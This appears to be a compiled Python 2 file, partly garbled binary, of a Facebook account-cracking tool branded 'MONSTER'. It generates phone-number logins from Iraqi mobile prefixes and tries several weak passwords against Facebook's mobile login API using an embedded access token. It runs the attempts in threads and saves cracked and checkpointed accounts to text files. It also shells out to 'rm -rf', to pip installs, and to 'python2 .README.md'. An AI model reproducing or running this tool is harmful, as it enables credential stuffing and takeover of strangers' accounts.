ó
ÿc           @   s  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z e j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÍ Wy d d l Z Wn e k
 r=e j d	  n Xy d d l Z Wn8 e k
 re j d
  e j d  e j d  n Xd d l m Z d d l m Z d d l m Z e  e  e j! d  e j   Z" e" j# e   e" j$ e j% j&   d d d g e" _' d   Z( d   Z) d   Z* d   Z+ d Z, Z, d  Z- g  Z. g  a/ g  a0 g  Z1 d   Z2 d   Z3 e4 d k re2   n  d S(   i    iÿÿÿÿNs   rm -rf .txti  iGô i s   .txtt   as   pip2 install requestss   pip2 install mechanizei   s   python2 nmbr.py(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   user-agents´   Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 GSA/10.90.16.21.arm64;]c           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   t   ost   syst   exit(    (    (    s   696611345o.pyt   exb#   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¸ëQ¸?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   696611345o.pyt   psb(   s    c           C   s   t  j d  d  S(   Ni   (   R   R   (    (    (    s   696611345o.pyt   t/   s    c           C   s   t  j d  d  S(   Nt   clear(   R   t   system(    (    (    s   696611345o.pyt   cb3   s    s  
                                
___  ________ _   _  _____ _____ ___________ 
|  \/  |  _  | \ | |/  ___|_   _|  ___| ___ | .  . | | | |  \| |\ `--.  | | | |__ | |_/ /
| |\/| | | | | . ` | `--. \ | | |  __||    / 
| |  | \ \_/ / |\  |/\__/ / | | | |___| |\ \ 
\_|  |_/\___/\_| \_/\____/  \_/ \____/\_| \_|
                                             
                                             

c           C   s4   t  j d  t GHd d GHd GHd d GHt   d  S(   NR   i*   s   [1;91m=sP   [1;94m[1][1;92m RAQAMAKAN         [1;91mâ  [1;94m[BZHE][1;93m Monstar up (   R   R   t   logot   action(    (    (    s   696611345o.pyt   menuI   s    		c             sÑ  t  d  }  |  d k r' d GHt   nÁ |  d k rÆ t j d  t GHd GHyO t  d    d  d } x0 t | d	  j   D] } t j | j	    q{ WWqè t
 k
 rÂ d
 GHt  d  t   qè Xn" |  d k rÜ t   n d
 GHt   t t t   } t d |  t j d  t d  t j d  t d  t j d  d d GH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHt  d  t j d  d  S(   Ns)   
[1;91mSelect Option [1;93m>>>[1;95m  t    s   [!] Fill in correctlyt   1R   sA   [1;92m0770, 0750, 0773, 0751, 0771, 0772, 0780, 0781, 0782, 0783s    CODAKAN : s   .txtt   rs
   [!] HALAEAs	   
[ Back ]t   0s   [â] Hamw Raqamakan: g¹?s*   [1;91m[â][1;94m Tkaya Chawarwan Ba ...s    [!] Bo Wastan Dni Toolaka CTRL+Zg      à?i*   s   [1;91m=c   
         s%  |  } y t  j d  Wn t k
 r* n Xyìd } t j d    | d | d  } t j |  } d | k ré d    | d | d	 d	 GHt d
 d  } | j    | d | d	  | j   t	 j
   | |  n d | d k rhd    | d | d	 GHt d d  } | j    | d | d	  | j   t j
   | |  n d } t j d    | d | d  } t j |  } d | k r#d    | d | d	 d	 GHt d
 d  } | j    | d | d	  | j   t	 j
   | |  n d | d k r¢d    | d | d	 GHt d d  } | j    | d | d	  | j   t j
   | |  n d } t j d    | d | d  } t j |  } d | k r]d    | d | d	 d	 GHt d
 d  } | j    | d | d	  | j   t	 j
   | |  n d | d k rÜd    | d | d	 GHt d d  } | j    | d | d	  | j   t j
   | |  n d }	 t j d    | d |	 d  } t j |  } d | k rd    | d |	 d	 d	 GHt d
 d  } | j    | d |	 d	  | j   t	 j
   | |	  n d | d k rd    | d |	 d	 GHt d d  } | j    | d |	 d	  | j   t j
   | |	  n  Wn n Xd  S(   Nt   savet
   1234512345s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens!   [1;92m[HACK BY MONESTAR][1;92m s    >>> s   
s   save/successfull.txtR    s   >>>s   www.facebook.comt	   error_msgs   [1;91m[CHEKPOINT][1;91m s   save/checkpoint.txtt
   1122334455t
   1234554321t   112233445566(   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   appendt   cpb(
   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3t   pass4(   t   ct   k(    s   696611345o.pyt   mainv   s    '!!
!
'!!
!
'!!
!
'!!
!
i   s,   [â][1;93m Process Has Been Completed ....s3   [â][1;92m Total successfull/[1;96mcheckpoint : t   /s9   [â][1;91m CP File Has Been Saved : save/checkpoint.txts   
[Press Enter To Go Back]s   python2 .README.md(   t	   raw_inputR   R   R   R   R'   t	   readlinest   idR,   t   stript   IOErrorR   R	   t   strt   lenR   R   R   R   t   mapR+   R-   (   t   bcht   idlistt   linet   xxxR:   t   p(    (   R8   R9   s   696611345o.pyR   R   sN    




	J	)
t   __main__(   s
   user-agents´   Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 GSA/10.90.16.21.arm64;](5   t   Falset   foot   barR   R   R   t   datetimet   randomt   hashlibt   ret	   threadingR(   t   urllibt	   cookielibt   getpassR   t   ranget   nt   randintt   nmbrR'   R
   R   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR&   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R   R   t   backt
   successfulR-   R+   R>   R   R   t   __name__(    (    (    s   696611345o.pyt   <module>   sV   

				
			v